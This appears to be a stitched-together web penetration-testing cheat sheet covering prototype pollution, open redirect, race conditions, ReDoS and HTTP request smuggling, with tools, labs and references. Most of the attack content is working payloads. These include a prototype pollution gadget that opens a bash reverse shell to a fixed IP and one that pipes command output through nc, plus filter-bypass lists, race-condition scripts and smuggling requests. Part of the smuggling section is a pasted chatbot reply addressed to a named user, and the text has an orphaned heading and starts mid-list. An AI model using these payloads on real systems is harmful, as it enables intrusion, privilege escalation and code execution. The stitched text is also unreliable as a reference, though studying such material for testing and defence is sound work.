5.5 Prototype Pollution → Full Account Takeover
{"constructor":{"prototype":{"role":"superadmin"}}}
```

---

## 🧪 Common Parameters to Fuzz for Prototype Pollution

```text
__proto__, constructor, prototype, __defineGetter__, __defineSetter__, toString, valueOf, hasOwnProperty, isAdmin, debug, config, settings, options, metadata, user, role, privileges, access, allowDots, json spaces
```
---
## 🔎 Where to Check Them

### 💻 Client-Side JS Sinks
- JSON config mergers like `$.extend()`, `Object.assign()`, lodash’s `_.merge`
- Parsing logic in React/Vue/Angular props or initializers
- Inputs from URL parameters, localStorage, postMessage, or cookies

### 🌐 Server-Side Vectors
- REST API endpoints that accept JSON body (especially config/user-related)
- Query strings (`?__proto__[key]=value`)
- Headers (`X-JSON: {"__proto__":{...}}`)
- Cookies (encoded JSON payloads)
- Third-party libraries that merge objects (Express, Hapi, Fastify)

---

## 🔁 How to Inject

Use each parameter in combinations like:

```json
{
  "__proto__": { "polluted": "true" }
}
```

or

```http
POST /api/vuln
Content-Type: application/json

{"constructor": {"newKey": "test"}}
```
---
## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [Examples](#examples)
    * [Manual Testing](#manual-testing)
    * [Prototype Pollution via JSON Input](#prototype-pollution-via-json-input)
    * [Prototype Pollution in URL](#prototype-pollution-in-url)
    * [Prototype Pollution Payloads](#prototype-pollution-payloads)
    * [Prototype Pollution Gadgets](#prototype-pollution-gadgets)
* [Labs](#labs)
* [References](#references)

## Tools

* [yeswehack/pp-finder](https://github.com/yeswehack/pp-finder) - Help you find gadget for prototype pollution exploitation
* [yuske/silent-spring](https://github.com/yuske/silent-spring) - Prototype Pollution Leads to Remote Code Execution in Node.js
* [yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution) - Server-Side Prototype Pollution gadgets in Node.js core code and 3rd party NPM packages
* [BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution) - Prototype Pollution and useful Script Gadgets
* [portswigger/server-side-prototype-pollution](https://github.com/portswigger/server-side-prototype-pollution) - Burp Suite Extension detectiong Prototype Pollution vulnerabilities
* [msrkp/PPScan](https://github.com/msrkp/PPScan) - Client Side Prototype Pollution Scanner

## Methodology

In JavaScript, prototypes are what allow objects to inherit features from other objects. If an attacker is able to add or modify properties of `Object.prototype`, they can essentially affect all objects that inherit from that prototype, potentially leading to various kinds of security risks.

```js
var myDog = new Dog();
```

```js
// Points to the function "Dog"
myDog.constructor;
```

```js
// Points to the class definition of "Dog"
myDog.constructor.prototype;
myDog.__proto__;
myDog["__proto__"];
```

### Examples

* Imagine that an application uses an object to maintain configuration settings, like this:

    ```js
    let config = {
        isAdmin: false
    };
    ```

* An attacker might be able to add an `isAdmin` property to `Object.prototype`, like this:

    ```js
    Object.prototype.isAdmin = true;
    ```

### Manual Testing

* ExpressJS: `{ "__proto__":{"parameterLimit":1}}` + 2 parameters in GET request, at least 1 must be reflected in the response.
* ExpressJS: `{ "__proto__":{"ignoreQueryPrefix":true}}` + `??foo=bar`
* ExpressJS: `{ "__proto__":{"allowDots":true}}` + `?foo.bar=baz`
* Change the padding of a JSON response: `{ "__proto__":{"json spaces":" "}}` + `{"foo":"bar"}`, the server should return `{"foo": "bar"}`
* Modify CORS header responses: `{ "__proto__":{"exposedHeaders":["foo"]}}`, the server should return the header `Access-Control-Expose-Headers`.
* Change the status code: `{ "__proto__":{"status":510}}`

### Prototype Pollution via JSON Input

You can access the prototype of any object via the magic property `__proto__`.
The `JSON.parse()` function in JavaScript is used to parse a JSON string and convert it into a JavaScript object. Typically it is a sink function where prototype pollution can happen.

```js
{
    "__proto__": {
        "evilProperty": "evilPayload"
    }
}
```

Asynchronous payload for NodeJS.

```js
{
  "__proto__": {
    "argv0":"node",
    "shell":"node",
    "NODE_OPTIONS":"--inspect=payload\"\".oastify\"\".com"
  }
}
```

Polluting the prototype via the `constructor` property instead.

```js
{
    "constructor": {
        "prototype": {
            "foo": "bar",
            "json spaces": 10
        }
    }
}
```

### Prototype Pollution in URL

Example of Prototype Pollution payloads found in the wild.

```ps1
https://victim.com/#a=b&__proto__[admin]=1
https://example.com/#__proto__[xxx]=alert(1)
http://server/servicedesk/customer/user/signup?__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=%3Cimg/src/onerror=alert(1)%3E
https://www.apple.com/shop/buy-watch/apple-watch?__proto__[src]=image&__proto__[onerror]=alert(1)
https://www.apple.com/shop/buy-watch/apple-watch?a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)
```

### Prototype Pollution Exploitation

Depending if the prototype pollution is executed client (CSPP) or server side (SSPP), the impact will vary.

* Remote Command Execution: [RCE in Kibana (CVE-2019-7609)](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)

    ```js
    .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
    .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
    ```

* Remote Command Execution: [RCE using EJS gadgets](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce)

    ```js
    {
        "__proto__": {
            "client": 1,
            "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id | nc localhost 4444')"
        }
    }
    ```

* Reflected XSS: [Reflected XSS on www.hackerone.com via Wistia embed code - #986386](https://hackerone.com/reports/986386)
* Client-side bypass: [Prototype pollution – and bypassing client-side HTML sanitizers](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)
* Denial of Service

### Prototype Pollution Payloads

```js
Object.__proto__["evilProperty"]="evilPayload"
Object.__proto__.evilProperty="evilPayload"
Object.constructor.prototype.evilProperty="evilPayload"
Object.constructor["prototype"]["evilProperty"]="evilPayload"
{"__proto__": {"evilProperty": "evilPayload"}}
{"__proto__.name":"test"}
x[__proto__][abaeead] = abaeead
x.__proto__.edcbcab = edcbcab
__proto__[eedffcb] = eedffcb
__proto__.baaebfc = baaebfc
?__proto__[test]=test
```

**1. Basic Prototype Injection**  
Pollute `Object.prototype` with arbitrary keys.

```json
{"__proto__": {"polluted": "true"}}
```

**Expected Behavior:** All objects inherit `polluted: true` property.

---

**2. Bypass Access Control via `isAdmin` Injection**  
Override privilege checks globally.

```json
{"__proto__": {"isAdmin": true}}
```

**Expected Behavior:** Application treats all users as admin.

---

**3. Modify CORS Headers**  
Inject into prototype to alter response headers.

```json
{"__proto__": {"exposedHeaders": ["X-Pwned"]}}
```

**Expected Behavior:** `Access-Control-Expose-Headers: X-Pwned` appears in response.

---

**4. Change Response Formatting**  
Alter JSON spacing or padding.

```json
{"__proto__": {"json spaces": 10}}
```

**Expected Behavior:** JSON response is padded with extra spaces.

---

**5. ExpressJS Parameter Limit Abuse**  
Trigger DoS or logic bypass.

```json
{"__proto__": {"parameterLimit": 1}}
```

**Expected Behavior:** Server restricts parameters, affecting routing or logic.

---

**6. Enable Dot Notation Parsing**  
Force parsing of nested keys.

```json
{"__proto__": {"allowDots": true}}
```

**Expected Behavior:** `foo.bar=baz` parsed as nested object.

---

**7. Status Code Manipulation**  
Override HTTP response status.

```json
{"__proto__": {"status": 510}}
```

**Expected Behavior:** Server responds with status code 510.

---

**8. Pollute via URL Parameters**  
Inject prototype keys via query string.

```
?__proto__[isAdmin]=true
```

**Expected Behavior:** Server-side object inherits `isAdmin: true`.

---

**9. Pollute via Headers**  
Inject prototype keys using custom headers.

```
X-JSON: {"__proto__": {"debug": true}}
```

**Expected Behavior:** Debug mode enabled globally.

---

**10. Pollute via Cookie**  
Inject prototype keys through session cookie.

```
Cookie: session={"__proto__": {"role": "admin"}}
```
**Expected Behavior:** All sessions treated as admin.
---


### Prototype Pollution Gadgets

A "gadget" in the context of vulnerabilities typically refers to a piece of code or functionality that can be exploited or leveraged during an attack. When we talk about a "prototype pollution gadget," we're referring to a specific code path, function, or feature of an application that is susceptible to or can be exploited through a prototype pollution attack.

Either create your own gadget using part of the source with [yeswehack/pp-finder](https://github.com/yeswehack/pp-finder), or try to use already discovered gadgets [yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution) / [BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution).

### Classic XXE

# Open URL Redirect
## Summary

* [Methodology](#methodology)
    * [HTTP Redirection Status Code](#http-redirection-status-code)
    * [Redirect Methods](#redirect-methods)
        * [Path-based Redirects](#path-based-redirects)
        * [JavaScript-based Redirects](#javascript-based-redirects)
        * [Common Query Parameters](#common-query-parameters)
    * [Filter Bypass](#filter-bypass)
* [Labs](#labs)
* [References](#references)

## Methodology

An open redirect vulnerability occurs when a web application or server uses unvalidated, user-supplied input to redirect users to other sites. This can allow an attacker to craft a link to the vulnerable site which redirects to a malicious site of their choosing.

Attackers can leverage this vulnerability in phishing campaigns, session theft, or forcing a user to perform an action without their consent.

**Example**: A web application has a feature that allows users to click on a link and be automatically redirected to a saved preferred homepage. This might be implemented like so:

```ps1
https://example.com/redirect?url=https://userpreferredsite.com
```

An attacker could exploit an open redirect here by replacing the `userpreferredsite.com` with a link to a malicious website. They could then distribute this link in a phishing email or on another website. When users click the link, they're taken to the malicious website.


## HTTP Redirection Status Code

HTTP Redirection status codes, those starting with 3, indicate that the client must take additional action to complete the request. Here are some of the most common ones:

- [300 Multiple Choices](https://httpstatuses.com/300) - This indicates that the request has more than one possible response. The client should choose one of them.
- [301 Moved Permanently](https://httpstatuses.com/301) - This means that the resource requested has been permanently moved to the URL given by the Location headers. All future requests should use the new URI.
- [302 Found](https://httpstatuses.com/302) - This response code means that the resource requested has been temporarily moved to the URL given by the Location headers. Unlike 301, it does not mean that the resource has been permanently moved, just that it is temporarily located somewhere else.
- [303 See Other](https://httpstatuses.com/303) - The server sends this response to direct the client to get the requested resource at another URI with a GET request.
- [304 Not Modified](https://httpstatuses.com/304) - This is used for caching purposes. It tells the client that the response has not been modified, so the client can continue to use the same cached version of the response.
- [305 Use Proxy](https://httpstatuses.com/305) -  The requested resource must be accessed through a proxy provided in the Location header. 
- [307 Temporary Redirect](https://httpstatuses.com/307) - This means that the resource requested has been temporarily moved to the URL given by the Location headers, and future requests should still use the original URI.
- [308 Permanent Redirect](https://httpstatuses.com/308) - This means the resource has been permanently moved to the URL given by the Location headers, and future requests should use the new URI. It is similar to 301 but does not allow the HTTP method to change.


## Redirect Methods

### Path-based Redirects

Instead of query parameters, redirection logic may rely on the path:

* Using slashes in URLs: `https://example.com/redirect/http://malicious.com`
* Injecting relative paths: `https://example.com/redirect/../http://malicious.com`


### JavaScript-based Redirects

If the application uses JavaScript for redirects, attackers may manipulate script variables:

**Example**:

```js
var redirectTo = "http://trusted.com";
window.location = redirectTo;
```

**Payload**: `?redirectTo=http://malicious.com`


### Common Parameters

```powershell
?checkout_url={payload}
?continue={payload}
?dest={payload}
?destination={payload}
?go={payload}
?image_url={payload}
?next={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
?return_path={payload}
?return_to={payload}
?return={payload}
?returnTo={payload}
?rurl={payload}
?target={payload}
?url={payload}
?view={payload}
/{payload}
/redirect/{payload}
```


## Filter Bypass

* Using a whitelisted domain or keyword
    ```powershell
    www.whitelisted.com.evil.com redirect to evil.com
    ```

* Using **CRLF** to bypass "javascript" blacklisted keyword
    ```powershell
    java%0d%0ascript%0d%0a:alert(0)
    ```

* Using "`//`" and "`////`" to bypass "http" blacklisted keyword
    ```powershell
    //google.com
    ////google.com
    ```

* Using "https:" to bypass "`//`" blacklisted keyword
    ```powershell
    https:google.com
    ```

* Using "`\/\/`" to bypass "`//`" blacklisted keyword
    ```powershell
    \/\/google.com/
    /\/google.com/
    ```

* Using "`%E3%80%82`" to bypass "." blacklisted character
    ```powershell
    /?redir=google。com
    //google%E3%80%82com
    ```

* Using null byte "`%00`" to bypass blacklist filter
    ```powershell
    //google%00.com
    ```

* Using HTTP Parameter Pollution
    ```powershell
    ?next=whitelisted.com&next=google.com
    ```

* Using "@" character. [Common Internet Scheme Syntax](https://datatracker.ietf.org/doc/html/rfc1738)
    ```powershell
    //<user>:<password>@<host>:<port>/<url-path>
    http://www.theirsite.com@yoursite.com/
    ```

* Creating folder as their domain
    ```powershell
    http://www.yoursite.com/http://www.theirsite.com/
    http://www.yoursite.com/folder/www.folder.com
    ```

* Using "`?`" character, browser will translate it to "`/?`"
    ```powershell
    http://www.yoursite.com?http://www.theirsite.com/
    http://www.yoursite.com?folder/www.folder.com
    ```

* Host/Split Unicode Normalization
    ```powershell
    https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
    http://a.com／X.b.com
    ```


## Labs

* [Root Me - HTTP - Open redirect](https://www.root-me.org/fr/Challenges/Web-Serveur/HTTP-Open-redirect)
* [PortSwigger - DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)


## References

- [Host/Split Exploitable Antipatterns in Unicode Normalization - Jonathan Birch - August 3, 2019](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)
- [Open Redirect Cheat Sheet - PentesterLand - November 2, 2018](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
- [Open Redirect Vulnerability - s0cket7 - August 15, 2018](https://s0cket7.com/open-redirect-vulnerability/)
- [Open-Redirect-Payloads - Predrag Cujanović - April 24, 2017](https://github.com/cujanovic/Open-Redirect-Payloads)
- [Unvalidated Redirects and Forwards Cheat Sheet - OWASP - February 28, 2024](https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
- [You do not need to run 80 reconnaissance tools to get access to user accounts - Stefano Vettorazzi (@stefanocoding) - May 16, 2019](https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781)

----

# Race Condition

> Race conditions may occur when a process is critically or unexpectedly dependent on the sequence or timings of other events. In a web application environment, where multiple requests can be processed at a given time, developers may leave concurrency to be handled by the framework, server, or programming language.

## Summary

- [Tools](#tools)
- [Methodology](#methodology)
    - [Limit-overrun](#limit-overrun)
    - [Rate-limit Bypass](#rate-limit-bypass)
- [Techniques](#techniques)
    - [HTTP/1.1 Last-byte Synchronization](#http11-last-byte-synchronization)
    - [HTTP/2 Single-packet Attack](#http2-single-packet-attack)
- [Turbo Intruder](#turbo-intruder)
    - [Example 1](#example-1)
    - [Example 2](#example-2)
- [Labs](#labs)
- [References](#references)

## Tools

- [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) - a Burp Suite extension for sending large numbers of HTTP requests and analyzing the results.
- [JavanXD/Raceocat](https://github.com/JavanXD/Raceocat) - Make exploiting race conditions in web applications highly efficient and ease-of-use.
- [nxenon/h2spacex](https://github.com/nxenon/h2spacex) - HTTP/2 Single Packet Attack low Level Library / Tool based on Scapy‌ + Exploit Timing Attacks

## Methodology

### Limit-overrun

Limit-overrun refers to a scenario where multiple threads or processes compete to update or access a shared resource, resulting in the resource exceeding its intended limits.

**Examples**: Overdrawing limit, multiple voting, multiple spending of a giftcard.

- [Race Condition allows to redeem multiple times gift cards which leads to free "money" - @muon4](https://hackerone.com/reports/759247)
- [Race conditions can be used to bypass invitation limit - @franjkovic](https://hackerone.com/reports/115007)
- [Register multiple users using one invitation - @franjkovic](https://hackerone.com/reports/148609)

### Rate-limit Bypass

Rate-limit bypass occurs when an attacker exploits the lack of proper synchronization in rate-limiting mechanisms to exceed intended request limits. Rate-limiting is designed to control the frequency of actions (e.g., API requests, login attempts), but race conditions can allow attackers to bypass these restrictions.

**Examples**: Bypassing anti-bruteforce mechanism and 2FA.

- [Instagram Password Reset Mechanism Race Condition - Laxman Muthiyah](https://youtu.be/4O9FjTMlHUM)

## Techniques

### HTTP/1.1 Last-byte Synchronization

Send every requests except the last byte, then "release" each request by sending the last byte.

Execute a last-byte synchronization using Turbo Intruder

```py
engine.queue(request, gate='race1')
engine.queue(request, gate='race1')
engine.openGate('race1')
```

**Examples**:

- [Cracking reCAPTCHA, Turbo Intruder style - James Kettle](https://portswigger.net/research/cracking-recaptcha-turbo-intruder-style)

### HTTP/2 Single-packet Attack

In HTTP/2 you can send multiple HTTP requests concurrently over a single connection. In the single-packet attack around ~20/30 requests will be sent and they will arrive at the same time on the server. Using a single request remove the network jitter.

- [PortSwigger/turbo-intruder/race-single-packet-attack.py](https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race-single-packet-attack.py)
- Burp Suite
    - Send a request to Repeater
    - Duplicate the request 20 times (CTRL+R)
    - Create a new group and add all the requests
    - Send group in parallel (single-packet attack)

**Examples**:

- [CVE-2022-4037 - Discovering a race condition vulnerability in Gitlab with the single-packet attack - James Kettle](https://youtu.be/Y0NVIVucQNE)

## Turbo Intruder

### Example 1

1. Send request to turbo intruder
2. Use this python code as a payload of the turbo intruder

   ```python
   def queueRequests(target, wordlists):
       engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False
                           )

   for i in range(30):
       engine.queue(target.req, i)
           engine.queue(target.req, target.baseInput, gate='race1')


       engine.start(timeout=5)
   engine.openGate('race1')

       engine.complete(timeout=60)


   def handleResponse(req, interesting):
       table.add(req)
   ```

3. Now set the external HTTP header x-request: %s - :warning: This is needed by the turbo intruder
4. Click "Attack"

### Example 2

This following template can use when use have to send race condition of request2 immediately after send a request1 when the window may only be a few milliseconds.

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    request1 = '''
POST /target-URI-1 HTTP/1.1
Host: <REDACTED>
Cookie: session=<REDACTED>

parameterName=parameterValue
    '''

    request2 = '''
GET /target-URI-2 HTTP/1.1
Host: <REDACTED>
Cookie: session=<REDACTED>
    '''

    engine.queue(request1, gate='race1')
    for i in range(30):
        engine.queue(request2, gate='race1')
    engine.openGate('race1')
    engine.complete(timeout=60)
def handleResponse(req, interesting):
    table.add(req)
```

## Labs

- [PortSwigger - Limit overrun race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun)
- [PortSwigger - Multi-endpoint race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint)
- [PortSwigger - Bypassing rate limits via race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits)
- [PortSwigger - Multi-endpoint race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint)
- [PortSwigger - Single-endpoint race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint)
- [PortSwigger - Exploiting time-sensitive vulnerabilities](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities)
- [PortSwigger - Partial construction race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction)

---------

# Regular Expression

> Regular Expression Denial of Service (ReDoS) is a type of attack that exploits the fact that certain regular expressions can take an extremely long time to process, causing applications or services to become unresponsive or crash.

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [Evil Regex](#evil-regex)
    * [Backtrack Limit](#backtrack-limit)
* [References](#references)

## Tools

* [tjenkinson/redos-detector](https://github.com/tjenkinson/redos-detector) - A CLI and library which tests with certainty if a regex pattern is safe from ReDoS attacks. Supported in the browser, Node and Deno.
* [doyensec/regexploit](https://github.com/doyensec/regexploit) - Find regular expressions which are vulnerable to ReDoS (Regular Expression Denial of Service)
* [devina.io/redos-checker](https://devina.io/redos-checker) - Examine regular expressions for potential Denial of Service vulnerabilities

## Methodology

### Evil Regex

Evil Regex contains:

* Grouping with repetition
* Inside the repeated group:
    * Repetition
    * Alternation with overlapping

**Examples**:

* `(a+)+`
* `([a-zA-Z]+)*`
* `(a|aa)+`
* `(a|a?)+`
* `(.*a){x}` for x \> 10

These regular expressions can be exploited with `aaaaaaaaaaaaaaaaaaaaaaaa!` (20 'a's followed by a '!').

```ps1
aaaaaaaaaaaaaaaaaaaa! 
```

For this input, the regex engine will try all possible ways to group the `a` characters before realizing that the match ultimately fails because of the `!`. This results in an explosion of backtracking attempts.

### Backtrack Limit

Backtracking in regular expressions occurs when the regex engine tries to match a pattern and encounters a mismatch. The engine then backtracks to the previous matching position and tries an alternative path to find a match. This process can be repeated many times, especially with complex patterns and large input strings.  

**PHP PCRE configuration options**:

| Name                 | Default | Note |
|----------------------|---------|---------|
| pcre.backtrack_limit | 1000000 | 100000 for `PHP < 5.3.7`|
| pcre.recursion_limit | 100000  | / |
| pcre.jit             | 1       | / |

Sometimes it is possible to force the regex to exceed more than 100 000 recursions which will cause a ReDOS and make `preg_match` returning false:

```php
$pattern = '/(a+)+$/';
$subject = str_repeat('a', 1000) . 'b';

if (preg_match($pattern, $subject)) {
    echo "Match found";
} else {
    echo "No match";
}
```
------

# Request Smuggling

> HTTP Request smuggling occurs when multiple "things" process a request, but differ on how they determine where the request starts/ends. This disagreement can be used to interfere with another user's request/response or to bypass security controls. It normally occurs due to prioritising different HTTP headers (Content-Length vs Transfer-Encoding), differences in handling malformed headers (eg whether to ignore headers with unexpected whitespace), due to downgrading requests from a newer protocol, or due to differences in when a partial request has timed out and should be discarded.

Absolutely, Anvesh! Here's a **complete and actionable HTTP Request Smuggling test case list** with sample payloads, aligned with your GitHub methodology and designed for direct use in manual testing, Burp Suite, or Smuggler automation.

---

## 🧪 HTTP Request Smuggling Test Cases with Payloads

---

### **1. CL.TE (Content-Length vs Transfer-Encoding)**
- Front-end honors `Content-Length`, back-end honors `Transfer-Encoding`.

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /malicious HTTP/1.1
Host: vulnerable.com
```

---

### **2. TE.CL (Transfer-Encoding vs Content-Length)**
- Front-end honors `Transfer-Encoding`, back-end honors `Content-Length`.

```http
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Content-Length: 6

5
GPOST /evil HTTP/1.1
Host: vulnerable.com

0
```

---

### **3. TE.TE (Dual Transfer-Encoding headers)**
- Conflicting `Transfer-Encoding` headers cause ambiguity.

```http
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Transfer-Encoding : chunked

0

GET /next HTTP/1.1
Host: vulnerable.com
```

---

### **4. CL.CL (Dual Content-Length headers)**
- Desync via conflicting `Content-Length` values.

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 10
Content-Length: 4

GET /hidden HTTP/1.1
```

---

### **5. CL.0 (Zero-Length Content Body)**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 0

GET /inject HTTP/1.1
Host: vulnerable.com
```

---

### **6. TE.0 (Zero chunk with extra body)**

```http
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked

0

GET /afterchunk HTTP/1.1
Host: vulnerable.com
```

---

### **7. Mixed Case Header Bypass**

```http
POST / HTTP/1.1
Host: vulnerable.com
transfer-encoding: chunked

0

GET /casebypass HTTP/1.1
Host: vulnerable.com
```

---

### **8. Space/Tab Injection in Header**

```http
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding : chunked

0

GET /spaceinject HTTP/1.1
Host: vulnerable.com
```

---

### **9. Line Ending Abuse (`\r\n`, `\r`, `\n`)**

```http
POST / HTTP/1.1\r\n
Host: vulnerable.com\r\n
Transfer-Encoding: chunked\r
\n
0\r\n
GET /newline HTTP/1.1\r\n
Host: vulnerable.com\r\n
```

---

### **10. Chunk Size Manipulation**

```http
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked

3
GET
0

GET /chunkinject HTTP/1.1
Host: vulnerable.com
```

---

### **11. Keep-Alive Poisoning**

```http
POST / HTTP/1.1
Host: vulnerable.com
Connection: keep-alive
Content-Length: 13

GET /poison HTTP/1.1
Host: vulnerable.com
```

---

### **12. Front-End Timeout Delay**
- Send partial request, delay second part.

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 20

GET /timeout HTTP/1.1
Host: vulnerable.com
```

---

### **13. Header Injection Smuggling**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 50

GET / HTTP/1.1
Host: vulnerable.com
X-Forwarded-For: evil.com
```

---

### **14. Method Override Smuggling**

```http
GET / HTTP/1.1
Host: vulnerable.com
Content-Length: 15

POST /admin HTTP/1.1
Host: vulnerable.com
```

---

### **15. Path Override Smuggling**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 20

GET /admin HTTP/1.1
Host: vulnerable.com
```

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [CL.TE Vulnerabilities](#clte-vulnerabilities)
    * [TE.CL Vulnerabilities](#tecl-vulnerabilities)
    * [TE.TE Vulnerabilities](#tete-vulnerabilities)
    * [HTTP/2 Request Smuggling](#http2-request-smuggling)
    * [Client-Side Desync](#client-side-desync)
* [Labs](#labs)
* [References](#references)

## Tools

* [bappstore/HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646) - An extension for Burp Suite designed to help you launch HTTP Request Smuggling attacks
* [defparam/Smuggler](https://github.com/defparam/smuggler) - An HTTP Request Smuggling / Desync testing tool written in Python 3
* [dhmosfunk/simple-http-smuggler-generator](https://github.com/dhmosfunk/simple-http-smuggler-generator) - This tool is developed for burp suite practitioner certificate exam and HTTP Request Smuggling labs.

## Methodology

If you want to exploit HTTP Requests Smuggling manually you will face some problems especially in TE.CL vulnerability you have to calculate the chunk size for the second request(malicious request) as PortSwigger suggests `Manually fixing the length fields in request smuggling attacks can be tricky.`.

### CL.TE Vulnerabilities

> The front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.

```powershell
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Example:

```powershell
POST / HTTP/1.1
Host: domain.example.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

### TE.CL Vulnerabilities

> The front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.

```powershell
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

Example:

```powershell
POST / HTTP/1.1
Host: domain.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86
Content-Length: 4
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0


```

:warning: To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.You need to include the trailing sequence `\r\n\r\n` following the final 0.

### TE.TE Vulnerabilities

> The front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.

```powershell
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

## HTTP/2 Request Smuggling

HTTP/2 request smuggling can occur if a machine converts your HTTP/2 request to HTTP/1.1, and you can smuggle an invalid content-length header, transfer-encoding header or new lines (CRLF) into the translated request. HTTP/2 request smuggling can also occur in a GET request, if you can hide an HTTP/1.1 request inside an HTTP/2 header

```ps1
:method GET
:path /
:authority www.example.com
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: www.example.com
```

## Client-Side Desync

On some paths, servers don't expect POST requests, and will treat them as simple GET requests, ignoring the payload, eg:

```ps1
POST / HTTP/1.1
Host: www.example.com
Content-Length: 37

GET / HTTP/1.1
Host: www.example.com
```

could be treated as two requests when it should only be one. When the backend server responds twice, the frontend server will assume only the first response is related to this request.

To exploit this, an attacker can use JavaScript to trigger their victim to send a POST to the vulnerable site:

```javascript
fetch('https://www.example.com/', {method: 'POST', body: "GET / HTTP/1.1\r\nHost: www.example.com", mode: 'no-cors', credentials: 'include'} )
```

This could be used to:

* get the vulnerable site to store a victim's credentials somewhere the attacker can access it
* get the victim to send an exploit to a site (eg for internal sites the attacker cannot access, or to make it harder to attribute the attack)
* to get the victim to run arbitrary JavaScript as if it were from the site

**Example**:

```javascript
fetch('https://www.example.com/redirect', {
    method: 'POST',
        body: `HEAD /404/ HTTP/1.1\r\nHost: www.example.com\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
        credentials: 'include',
        mode: 'cors' // throw an error instead of following redirect
}).catch(() => {
        location = 'https://www.example.com/'
})
```

This script tells the victim browser to send a `POST` request to `www.example.com/redirect`. That returns a redirect which is blocked by CORS, and causes the browser to execute the catch block, by going to `www.example.com`.

`www.example.com` now incorrectly processes the `HEAD` request in the `POST`'s body, instead of the browser's `GET` request, and returns 404 not found with a content-length, before replying to the next misinterpreted third (`GET /x?x=<script>...`) request and finally the browser's actual `GET` request.
Since the browser only sent one request, it accepts the response to the `HEAD` request as the response to its `GET` request and interprets the third and fourth responses as the body of the response, and thus executes the attacker's script.

## Labs

* [PortSwigger - HTTP request smuggling, basic CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)
* [PortSwigger - HTTP request smuggling, basic TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)
* [PortSwigger - HTTP request smuggling, obfuscating the TE header](https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header)
* [PortSwigger - Response queue poisoning via H2.TE request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)
